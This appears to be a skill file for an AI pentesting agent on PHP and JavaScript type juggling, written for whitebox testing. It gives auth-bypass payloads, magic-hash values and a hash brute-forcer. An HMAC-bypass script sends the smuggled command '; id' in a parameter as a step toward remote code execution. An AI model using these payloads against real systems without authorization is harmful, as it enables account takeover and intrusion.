---
name: type-juggling
description: PHP (and JavaScript) Type Juggling — loose comparison bypasses, magic hash authentication bypass, strcmp/array bypass, JSON boolean injection, numeric string coercion. Use when HauntMode flags type juggling as APPLIES/MAYBE, when the app is PHP and uses == for comparisons, when login accepts JSON, or when you need auth bypass techniques exploiting implicit type coercion.
---

# Type Juggling (INDEX — Whitebox Attacks)

This skill covers detection, confirmation, and exploitation of PHP type juggling vulnerabilities, with coverage of JavaScript loose comparison issues. Read top to bottom on first invocation; later runs can jump to the relevant section.

---

## 1. Triggers — when this skill applies

- PHP app uses `==` or `!=` (loose comparison) for authentication or access control checks — especially password comparison, token validation, HMAC verification
- Login endpoint accepts JSON body → you can send `{"password": 0}` or `{"password": true}` instead of a string
- App compares a hash value (md5/sha1/sha256) of user input against a stored hash using `==`
- App calls `strcmp($user_input, $secret)` with `==` on the result
- `strpos()` result is compared with `!= false` (should be `!== false`)
- Source code review finds `switch`, `if/else if` without strict comparison operators
- PHP version < 8.0 detected (many type juggling behaviours changed in PHP 8)

---

---

## 3. 30-second triage

PHP version check (from headers / error messages / `X-Powered-By`):
- PHP < 8.0: `0 == "php"` is `true`, `strcmp(array, string)` returns `null`
- PHP >= 8.0: many juggling behaviours fixed

Quick probes to try on any login/token endpoint:

**JSON body (if app accepts JSON):**
```json
{"username": "admin", "password": 0}
{"username": "admin", "password": true}
{"username": "admin", "password": null}
{"username": "admin", "password": []}
```

**Form body — array bypass:**
```
username=admin&password[]=x
```

**Magic hash — try if you can see the hash being compared:**
```
# If hash starts with 0e followed by all digits, it's "magic"
# Try submitting a value whose hash also starts with 0e...
```

---

## 4. PHP Loose Comparison Reference Table

Key behaviours from notes (PHP 7 behaviour; PHP 8 changes noted):

| Left | Right | PHP 7 result | PHP 8 result |
|---|---|---|---|
| `0` | `"php"` | `true` | `false` |
| `0` | `""` | `true` | `false` |
| `0` | `null` | `true` | `true` |
| `0` | `"0"` | `true` | `true` |
| `"1"` | `"01"` | `true` | `true` |
| `"100"` | `"1e2"` | `true` | `true` |
| `"0e123"` | `"0e456"` | `true` | `false` (not numeric) |
| `null` | `false` | `true` | `true` |
| `null` | `""` | `true` | `true` |
| `null` | `[]` | `true` | `true` |
| `[]` | `false` | `true` | `true` |
| `1` | `"1 extra"` | `true` | `false` |

Full table: https://www.php.net/manual/en/types.comparisons.php

---

## 5. Detection

### 5.1 Source-code pattern search

```bash
grep -rn "==" routes/ src/ includes/ | grep -v "===" | grep -i "password\|token\|hash\|key\|secret\|auth"
grep -rn "strcmp\|strpos\|hash_hmac\|md5\|sha" . | grep "=="
```

High-value targets:
- `if ($data['password'] == $user['password'])` → JSON numeric injection (`0`)
- `if (strcmp($input, $secret) == 0)` → array bypass (`pw[]=x`)
- `if (hash('sha256', $input) == $stored_hash)` → magic hash
- `if (strpos($username, 'admin') != false)` → `strpos` returns `0` (falsy) when match is at position 0

### 5.2 strpos false-negative bypass

```php
// Vulnerable: position 0 == false is true (string "admin" at index 0 returns 0, which == false)
if (strpos($_SESSION['username'], 'admin') != false)
```
Bypass: register username `admin<anything>` → strpos returns 0 → `0 != false` is false → access denied.
But: username `xadmin` → strpos returns 1 → `1 != false` is true → access granted.

This is a logic error not a juggling attack, but the root cause is the same: `!=` vs `!==`.

---

## 6. Exploitation

### 6.1 JSON boolean / numeric injection (PHP < 8.0)

App accepts JSON, compares password with `==`:
```
POST /login HTTP/1.1
Content-Type: application/json

{"username": "admin", "password": 0}
```
Explanation: `0 == "anystring"` is `true` in PHP < 8.0 because string is cast to int (non-numeric string → 0).

Also try:
```json
{"username": "admin", "password": true}
{"username": "admin", "password": null}
{"username": "admin", "password": "0"}
```

### 6.2 strcmp array bypass (PHP < 8.0)

```
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password[]=anything
```
`strcmp(array, string)` returns `null` in PHP < 8.0. `null == 0` is `true`. Auth bypass.

Note: PHP 8.0+ throws a TypeError instead.

### 6.3 Magic hash bypass

Condition: `hash('sha256', $input) == $stored_hash` where `$stored_hash` starts with `0e` followed by all digits.

Because both sides look like scientific notation floats → PHP casts both to `0.0` → equal.

Known SHA-256 magic hashes (from notes):
```
34250003024812
TyNOQHUS
CGq'v]`1
```

Known MD5 magic hashes: `240610708`, `QNKCDZO`, `aabg74k`, `aabC9RqS`

Lookup: https://github.com/spaze/hashes — select hash algorithm, get pre-computed magic values.

If the app salts before hashing: `hash('md5', $salt . $input)` — need to find a magic hash for the specific salt. Write a brute-forcer:
```python
import hashlib, itertools, string

SALT = "known_salt"
HASH_ALG = "md5"

for length in range(1, 8):
    for combo in itertools.product(string.ascii_lowercase + string.digits, repeat=length):
        pw = "".join(combo)
        h = hashlib.new(HASH_ALG, (SALT + pw).encode()).hexdigest()
        if h.startswith("0e") and h[2:].isdigit():
            print(f"[+] Magic value: {pw} → {h}")
            exit()
```

### 6.4 HMAC type juggling (numeric MAC bypass)

From notes advanced lab — HMAC is checked with `==` and truncated to hex:
```php
function check_hmac($dir, $nonce, $mac) {
    return $mac == custom_hmac($dir, $nonce);  // LOOSE comparison
}
```
Attack: pass `mac=0`. If the server-computed HMAC is of format `0e[0-9]+` (magic hash), `0 == "0e12345678"` is `true`.

Brute-force nonce until server computes a magic HMAC:
```python
import requests

URL = "http://TARGET/dir.php"
COOKIES = {"PHPSESSID": "your_session"}
DIR = "/home/user/; id"
MAC = 0

for nonce in range(0, 20000):
    r = requests.get(URL, cookies=COOKIES, params={"dir": DIR, "nonce": nonce, "mac": MAC})
    if "Invalid MAC" not in r.text:
        print(f"Found: nonce={nonce}")
        print(r.url)
        break
```

Note: since `DIR` value affects the HMAC, a new nonce brute-force is needed each time you change the payload.

### 6.5 JavaScript JSON type confusion

Node.js apps that accept JSON and compare with `==` or `===` on the wrong type:
```json
{"password": true}
{"password": null}
{"password": 0}
{"password": []}
{"password": {}}
```
JavaScript strict `===` is safer, but apps using MongoDB or ORMs may have type coercion in the query layer.

---

## 7. Bypass techniques

| Scenario | Technique |
|---|---|
| PHP 8.0 — `0 == "str"` is now `false` | Use magic hash approach instead (hash comparison may still be loose) |
| strcmp fixed in PHP 8 | Look for other `==` comparisons: hash compare, token compare |
| Salt is unknown | Can't precompute magic hash — need to know or discover salt first |
| Input is `is_string()` checked | Array bypass blocked; try `{"password":0}` JSON numeric |
| JSON not accepted, form only | Use `pw[]=value` for array bypass |
| Magic hash not found for algorithm+salt | Increase brute-force length range; common magic hashes are 4–8 chars |

---

## 8. False-positive checks

- Confirmed `0 == "string"` in PHP, but PHP version is 8.0+ → this specific behaviour is fixed. Verify actual PHP version from headers or error messages before claiming exploitability.
- Magic hash bypass requires the **stored** hash to also be a magic hash — you can't choose the stored hash. Verify by checking if the hash in the source or DB starts with `0e` followed by all digits.
- strcmp array bypass: PHP 8 throws TypeError, not null. If you get a 500 error with array input on PHP 8, that's a crash not a bypass.
- `strpos` bypass depends on exact username matching and whether admin usernames are known or registerable.

---

## 9. Chain candidates

| Chain | Paired skill | Impact |
|---|---|---|
| Type juggling auth bypass → admin access | `auth-bypass` | Admin panel access |
| Type juggling HMAC bypass → command injection | `cmdi` | RCE (notes advanced lab pattern) |
| Magic hash bypass → account takeover | `auth-bypass` | Take over any account whose hash is magic |
| JSON type injection + prototype pollution | `prototype-pollution` | Combined Node.js attack |
| Type juggling in password reset token check | `auth-bypass` | Reset any account's password |
| strpos logic error → privilege escalation | `idor` | Access restricted features |

---

## 10. Reporting template

```
POTENTIAL FINDING: Type Juggling — <Loose Comparison | Magic Hash | strcmp Array Bypass | JSON Type Injection>
Target: <URL / endpoint>
Parameter: <param name + location: JSON body / form field / query param>
PHP version: <detected version, e.g. PHP 7.4.x — confirms PHP < 8 behaviours apply>
Vulnerable code pattern:
    <e.g. "if ($data['password'] == $user['password'])" — loose comparison with JSON body>
    <e.g. "if(strcmp($_POST['pw'], $admin_pw) == 0)" — strcmp null == 0>
    <e.g. "if (hash('sha256', $input) == $stored)" — magic hash>
Bypass payload:
    <exact request body, e.g. {"username":"admin","password":0}>
Evidence:
    <response showing successful auth / session cookie received / redirect to dashboard>
Impact:
    <e.g. "Authentication bypass — attacker can log in as admin without the password">
    <e.g. "HMAC check bypassed → arbitrary command execution via dir parameter">
Chain potential: <other skills>
Next step: <e.g. "Escalate to RCE via command injection in /dir.php?dir=...;id">
```

---

## 11. Recon tracker vector strings

Only log if user explicitly says to.

- `juggling:json-numeric:<endpoint>` — JSON numeric/boolean injection bypassed auth
- `juggling:strcmp-array:<endpoint>` — strcmp array bypass confirmed
- `juggling:magic-hash:<algorithm>` — magic hash bypass confirmed for named algorithm
- `juggling:hmac-bypass:<endpoint>` — HMAC loose comparison bypassed
- `juggling:strpos-logic:<endpoint>` — strpos false-negative logic error
- `juggling:no:<endpoint>` — tested, strict comparisons used throughout

---

## 12. What NOT to do

- Do NOT assume PHP 7 behaviours apply without verifying the PHP version — PHP 8 fixed many key type juggling cases.
- Do NOT brute-force magic hashes on the production server at high speed — rate limits apply; run the brute-forcer locally then send the single found value.
- Do NOT skip looking at hash comparisons when `strcmp` is patched — hash magic-hash vectors are independent.
- Do NOT rely on this skill for JavaScript unless confirmed the JS app uses `==` (most modern JS apps use `===`).
- Do NOT auto-log to recon tracker without explicit user instruction.
